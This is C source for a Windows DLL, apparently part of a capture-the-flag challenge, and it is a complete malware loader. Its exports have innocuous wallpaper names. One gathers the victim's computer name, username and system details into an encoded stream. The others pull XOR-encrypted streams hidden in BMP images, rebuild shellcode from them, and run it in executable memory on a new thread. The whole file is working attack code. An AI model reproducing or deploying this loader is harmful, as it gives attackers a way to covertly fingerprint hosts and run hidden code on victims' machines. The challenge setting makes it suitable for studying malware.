// payload.c - DLL loaded from embedded images
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <windows.h>

#define OUTPUT_FILE "recovered_flag.txt"

// Dynamic XOR key (extracted from tick_count)
static uint8_t g_last_tick_key = 0;   // Key from last WallpaperSlider call
static uint8_t g_session_key = 0;     // Key stored when metadata is found

// System info structure with garbage padding
#pragma pack(push, 1)
typedef struct {
    uint32_t magic;              // 0xCAFEBABE
    uint8_t  padding1[13];       // Garbage
    char     computer_name[32];
    uint8_t  padding2[7];        // Garbage
    char     username[32];
    uint8_t  padding3[19];       // Garbage
    uint32_t os_major;
    uint32_t os_minor;
    uint32_t os_build;
    uint8_t  padding4[11];       // Garbage
    uint32_t num_processors;
    uint32_t page_size;
    uint8_t  padding5[23];       // Garbage
    uint64_t total_memory;
    uint8_t  padding6[9];        // Garbage
    uint32_t tick_count;
    uint8_t  padding7[17];       // Garbage
    uint32_t checksum;           // Simple checksum
} SystemInfoStruct;
#pragma pack(pop)

// Metadata structure (returned from scan)
typedef struct {
    uint32_t target_index1;
    uint32_t target_index2;
    uint32_t offset;
    uint32_t size;
} MetadataResult;

// Stream extraction state (shared between calls)
static struct {
    uint8_t* stream1;
    uint8_t* stream2;
    uint32_t size;
    uint32_t payload_offset;
    uint32_t target_index1;
    uint32_t target_index2;
    BOOL stream1_received;
    BOOL stream2_received;
} g_streams = {0};

// Helper: XOR decrypt
static void xor_decrypt(uint8_t* data, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Helper: Fill garbage with pseudo-random data
static void fill_garbage(uint8_t* buf, size_t len) {
    for (size_t i = 0; i < len; i++) {
        buf[i] = (uint8_t)((GetTickCount() ^ (i * 0x5DEECE66D)) & 0xFF);
    }
}

// Helper: Convert bytes to hex string
static void bytes_to_hex(const uint8_t* data, size_t len, char* hex_out) {
    const char hex_chars[] = "0123456789ABCDEF";
    for (size_t i = 0; i < len; i++) {
        hex_out[i * 2]     = hex_chars[(data[i] >> 4) & 0x0F];
        hex_out[i * 2 + 1] = hex_chars[data[i] & 0x0F];
    }
    hex_out[len * 2] = '\0';
}

// Helper: Base64 encode
static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char* base64_encode(const char* input, size_t len) {
    size_t out_len = 4 * ((len + 2) / 3);
    char* output = (char*)malloc(out_len + 1);
    if (!output) return NULL;
    
    size_t i, j;
    for (i = 0, j = 0; i < len; ) {
        uint32_t octet_a = i < len ? (unsigned char)input[i++] : 0;
        uint32_t octet_b = i < len ? (unsigned char)input[i++] : 0;
        uint32_t octet_c = i < len ? (unsigned char)input[i++] : 0;
        
        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;
        
        output[j++] = b64_table[(triple >> 18) & 0x3F];
        output[j++] = b64_table[(triple >> 12) & 0x3F];
        output[j++] = b64_table[(triple >> 6) & 0x3F];
        output[j++] = b64_table[triple & 0x3F];
    }
    
    // Padding
    int mod = len % 3;
    if (mod > 0) {
        output[out_len - 1] = '=';
        if (mod == 1) output[out_len - 2] = '=';
    }
    
    output[out_len] = '\0';
    return output;
}

// ============================================================
// EXPORTED FUNCTION 1: Get system info as hex stream
// ============================================================
__declspec(dllexport) char* WallpaperSlider(void) {
    SystemInfoStruct* info = (SystemInfoStruct*)malloc(sizeof(SystemInfoStruct));
    if (!info) return NULL;
    
    memset(info, 0, sizeof(SystemInfoStruct));
    
    // Magic header
    info->magic = 0xCAFEBABE;
    
    // Fill garbage padding
    fill_garbage(info->padding1, sizeof(info->padding1));
    fill_garbage(info->padding2, sizeof(info->padding2));
    fill_garbage(info->padding3, sizeof(info->padding3));
    fill_garbage(info->padding4, sizeof(info->padding4));
    fill_garbage(info->padding5, sizeof(info->padding5));
    fill_garbage(info->padding6, sizeof(info->padding6));
    fill_garbage(info->padding7, sizeof(info->padding7));
    
    // Computer name
    DWORD size = sizeof(info->computer_name);
    GetComputerNameA(info->computer_name, &size);
    
    // Username
    size = sizeof(info->username);
    GetUserNameA(info->username, &size);
    
    // OS version info
    OSVERSIONINFOA osvi;
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    #pragma warning(suppress: 4996)
    GetVersionExA(&osvi);
    info->os_major = osvi.dwMajorVersion;
    info->os_minor = osvi.dwMinorVersion;
    info->os_build = osvi.dwBuildNumber;
    
    // System info
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    info->num_processors = sysinfo.dwNumberOfProcessors;
    info->page_size = sysinfo.dwPageSize;
    
    // Memory info
    MEMORYSTATUSEX memstat;
    memstat.dwLength = sizeof(memstat);
    GlobalMemoryStatusEx(&memstat);
    info->total_memory = memstat.ullTotalPhys;
    
    // Tick count
    info->tick_count = GetTickCount();
    
    // Store tick_count as XOR key (use low byte)
    g_last_tick_key = (uint8_t)(info->tick_count & 0xFF);
    
    // Calculate simple checksum
    uint32_t checksum = 0;
    uint8_t* bytes = (uint8_t*)info;
    for (size_t i = 0; i < sizeof(SystemInfoStruct) - sizeof(uint32_t); i++) {
        checksum = (checksum << 1) ^ bytes[i];
    }
    info->checksum = checksum;
    
    // Convert to hex string
    size_t hex_len = sizeof(SystemInfoStruct) * 2 + 1;
    char* hex_stream = (char*)malloc(hex_len);
    if (!hex_stream) {
        free(info);
        return NULL;
    }
    
    bytes_to_hex((uint8_t*)info, sizeof(SystemInfoStruct), hex_stream);
    free(info);
    
    // Base64 encode the hex stream
    char* b64_stream = base64_encode(hex_stream, strlen(hex_stream));
    free(hex_stream);
    
    return b64_stream;
}

// ============================================================
// EXPORTED FUNCTION 2: Scan image for metadata
// Returns NULL if not found, or pointer to MetadataResult
// ============================================================
__declspec(dllexport) MetadataResult* WallpaperCache(const char* filepath) {
    
    FILE* file = fopen(filepath, "rb");
    if (!file) {
        return NULL;
    }
    
    // Get file size
    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    fseek(file, 0, SEEK_SET);
        
    if (filesize < 70) {
        fclose(file);
        return NULL;
    }
    
    // Read entire file
    uint8_t* data = (uint8_t*)malloc(filesize);
    if (!data) {
        fclose(file);
        return NULL;
    }
    
    fread(data, 1, filesize, file);
    fclose(file);
    
    // Scan for metadata (24 bytes) starting after BMP header (~54 bytes)
    for (long offset = 54; offset <= filesize - 24; offset++) {
        // Try to decrypt potential metadata using current tick key
        uint8_t metadata[24];
        memcpy(metadata, &data[offset], 24);
        xor_decrypt(metadata, 24, g_last_tick_key);
        
        // Check for magic delimiters
        uint32_t magic_start = *(uint32_t*)&metadata[0];
        uint32_t magic_end = *(uint32_t*)&metadata[20];
        
        if (magic_start == 0xDEADBEEF && magic_end == 0xBEEFDEAD) {
            // Parse decrypted metadata
            uint32_t index1 = *(uint32_t*)&metadata[4];
            uint32_t index2 = *(uint32_t*)&metadata[8];
            uint32_t payload_offset = *(uint32_t*)&metadata[12];
            uint32_t payload_size = *(uint32_t*)&metadata[16];
            
            // Validate metadata
            if (index1 >= 2 && index1 <= 10 && 
                index2 >= 2 && index2 <= 10 && 
                index1 != index2 &&
                payload_offset >= 100 && payload_offset <= 1024 && 
                payload_size > 0 && payload_size < 1000) {
                
                // Allocate and return result
                MetadataResult* result = (MetadataResult*)malloc(sizeof(MetadataResult));
                if (result) {
                    result->target_index1 = index1;
                    result->target_index2 = index2;
                    result->offset = payload_offset;
                    result->size = payload_size;
                    
                    // Initialize stream state
                    if (g_streams.stream1) free(g_streams.stream1);
                    if (g_streams.stream2) free(g_streams.stream2);
                    
                    g_streams.stream1 = (uint8_t*)malloc(payload_size);
                    g_streams.stream2 = (uint8_t*)malloc(payload_size);
                    g_streams.size = payload_size;
                    g_streams.payload_offset = payload_offset;
                    g_streams.target_index1 = index1;
                    g_streams.target_index2 = index2;
                    g_streams.stream1_received = FALSE;
                    g_streams.stream2_received = FALSE;
                    
                    // Store session key for later decryption
                    g_session_key = g_last_tick_key;
                }
                
                free(data);
                return result;
            }
        }
    }
    
    free(data);
    return NULL;
}

// ============================================================
// EXPORTED FUNCTION 3: Extract XOR stream from image
// Called for each image when metadata is active
// Returns: 0 = nothing extracted, 1 = stream1, 2 = stream2, 3 = both ready
// ============================================================
__declspec(dllexport) int ServerDefault(const char* filepath, uint32_t counter) {
    if (!g_streams.stream1 || !g_streams.stream2) return 0;
    
    FILE* file = fopen(filepath, "rb");
    if (!file) return 0;
    
    // Get file size
    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    // Find metadata to get offset (re-scan since we need offset from this specific image)
    uint8_t* data = (uint8_t*)malloc(filesize);
    if (!data) {
        fclose(file);
        return 0;
    }
    fread(data, 1, filesize, file);
    fclose(file);
    
    // Use stored payload offset from metadata
    uint32_t payload_offset = g_streams.payload_offset;
    
    int result = 0;
    
    // Check if current counter matches target indices
    if (counter == g_streams.target_index1 && !g_streams.stream1_received) {
        if (filesize >= (long)(payload_offset + g_streams.size)) {
            memcpy(g_streams.stream1, &data[payload_offset], g_streams.size);
            g_streams.stream1_received = TRUE;
            result = 1;
        }
    } else if (counter == g_streams.target_index2 && !g_streams.stream2_received) {
        if (filesize >= (long)(payload_offset + g_streams.size)) {
            memcpy(g_streams.stream2, &data[payload_offset], g_streams.size);
            g_streams.stream2_received = TRUE;
            result = 2;
        }
    }
    
    free(data);
    
    // Check if both streams are ready
    if (g_streams.stream1_received && g_streams.stream2_received) {
        return 3;
    }
    
    return result;
}

// ============================================================
// EXPORTED FUNCTION 4: Decode streams and execute as shellcode
// ============================================================
__declspec(dllexport) BOOL ServerBackward(const char* output_path) {
    (void)output_path;  // Unused - kept for API compatibility    
    if (!g_streams.stream1_received || !g_streams.stream2_received) {
        return FALSE;
    }
        
    // Allocate buffer for decoded shellcode
    uint8_t* shellcode = (uint8_t*)malloc(g_streams.size);
    if (!shellcode) {
        return FALSE;
    }
    
    // XOR the two streams and the session key to recover shellcode
    for (uint32_t i = 0; i < g_streams.size; i++) {
        shellcode[i] = g_streams.stream1[i] ^ g_streams.stream2[i] ^ g_session_key;
    }
    
    // Allocate executable memory (don't free - shellcode thread needs it)
    void* exec_mem = VirtualAlloc(NULL, g_streams.size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        free(shellcode);
        return FALSE;
    }
    
    // Copy shellcode to executable memory
    memcpy(exec_mem, shellcode, g_streams.size);
    free(shellcode);
        
    // Execute shellcode in a separate thread so main loop continues
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);  // Don't wait for it, let it run independently
    } else {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Cleanup streams
    free(g_streams.stream1);
    free(g_streams.stream2);
    memset(&g_streams, 0, sizeof(g_streams));
    
    return TRUE;
}

// ============================================================
// DLL Entry Point
// ============================================================
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            // Cleanup streams if still allocated
            if (g_streams.stream1) free(g_streams.stream1);
            if (g_streams.stream2) free(g_streams.stream2);
            break;
    }
    return TRUE;
}